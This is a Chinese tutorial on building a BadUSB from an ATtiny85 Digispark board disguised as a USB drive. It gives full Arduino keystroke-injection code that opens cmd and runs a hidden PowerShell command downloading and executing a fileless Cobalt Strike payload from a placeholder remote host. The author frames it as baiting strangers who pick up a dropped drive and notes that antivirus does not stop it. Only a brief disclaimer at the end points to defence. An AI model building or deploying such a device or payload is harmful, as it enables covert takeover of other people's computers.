## 引言

在茫茫的人海中，走着路，突然看到地上有个像U盘的东西，于是捡了起来。回到家，不忙不急插入电脑看看里面有什么，忽然一闪的黑窗口。之后识别不出。就扔进垃圾桶。

那么恭喜你，我的CS上线了，哈哈哈~~

那么，如何实现的呢？其实你捡到的只是一个类似于键盘的硬件，里面写有所执行的cmd命令而已。当你插入U盘，设好等到加载时间，直接执行cmd，执行木马。有人会问，我电脑有杀毒软件，怕啥？遗憾告诉你，杀毒软件，不杀硬件。啊哈哈哈~~~（不落地的木马）

制作一个这种成本大概10块钱左右，本测试使用了Attiny85,于是就不折腾了，直接买了一个带USB的，某宝也有带U盘外壳；有些老板还可以帮你印个64G哈哈哈。

如图：

![](https://image.3001.net/images/20210116/1610779944_60028d28bc55dfb56703b.png!small)

## 动手开造

我自己买的是Attiny85，不带外壳的，长这样子

![](https://image.3001.net/images/20210116/1610780141_60028dedf165898954db9.png!small)

去arduino官网下载软件，这个软件作为烧录作用，把代码编译成二进制固件，之后烧写进去。

准备流程：

    
    
    usb虚拟键盘arduino IDE下载https://www.arduino.cc/en/Main/Softwaredigispark驱动下载https://github.com/digistump/DigistumpArduino/releases

然后在arduino IDE加入对digispark开发板的支持

在文件->首选项中加入附加开发板管理

    
    
    http://digistump.com/package_digistump_index.json

![](https://image.3001.net/images/20210116/1610780224_60028e4061f3bf05180b3.png!small)安装好之后，在工具中选中开发板Digispark
(Default - 16.5mHz)

![](https://image.3001.net/images/20210116/1610780282_60028e7a535f4f6a87922.png!small)

配置好以后，创建项目将代码放进去，测试代码，点击上传

    
    
    #include "DigiKeyboard.h"void setup() {// put your setup code here, to run once:DigiKeyboard.delay(2000);DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);DigiKeyboard.delay(300);DigiKeyboard.println("cmd");DigiKeyboard.delay(300);DigiKeyboard.println("echo OK");}void loop() {}

点击上传以后出现下图

![](https://image.3001.net/images/20210116/1610780365_60028ecdf198c58070de2.png!small)

意思是你在60秒插入digispark就能上传了，这时候在usb插入Attiny85模块

![](https://image.3001.net/images/20210116/1610780458_60028f2a2ed538f17097d.png!small)

这样子显示，就是烧写完毕了~~~离成功又进一步了。再将Attiny85模块插入电脑，就会弹出

![](https://image.3001.net/images/20210116/1610780498_60028f521cbc203fcdcde.png!small)

接下来修改代码，将echo OK替换成CS的不落地神马。

    
    
    #include "DigiKeyboard.h"//库文件void setup() {// setup函数只运行一次DigiKeyboard.delay(2000);//等待两秒，给电脑自动加载配置时间DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//摁住WIN键DigiKeyboard.delay(300);//等待300毫秒DigiKeyboard.println("cmd");//输入CMDDigiKeyboard.delay(300);DigiKeyboard.println("powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://xxx.xxx.xxx.xx:xxxx/a'))\"");//执行PAYLOAD，双引号需要斜杠转义}void loop() {}

安装上面的步骤再来一遍，就好了~

## 总结

陌生软硬盘，切勿直接插入电脑。仅供学习交流，请勿违法使用。

